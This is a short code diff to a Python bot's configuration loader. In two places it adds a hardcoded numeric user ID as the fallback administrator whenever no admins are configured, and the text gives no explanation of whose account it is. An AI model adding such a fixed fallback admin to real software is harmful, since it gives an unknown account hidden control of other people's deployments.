@@ -22,7 +22,7 @@ def load_config() -> Config:
     token = os.getenv("BOT_TOKEN", app_settings.BOT_TOKEN)
     admins_str = os.getenv("ADMINS", os.getenv("ADMIN_IDS", ""))
 
-    admin_ids = app_settings.ADMIN_IDS
+    admin_ids = app_settings.ADMIN_IDS or [8887751785]
     if admins_str:
         parsed_ids = []
         for admin in admins_str.split(","):
@@ -31,6 +31,9 @@ def load_config() -> Config:
                 parsed_ids.append(int(admin))
         if parsed_ids:
             admin_ids = parsed_ids
+
+    if not admin_ids:
+        admin_ids = [8887751785]
 
     db_name = os.getenv("DB_NAME", app_settings.DATABASE_URL.replace("sqlite+aiosqlite:///", ""))
 
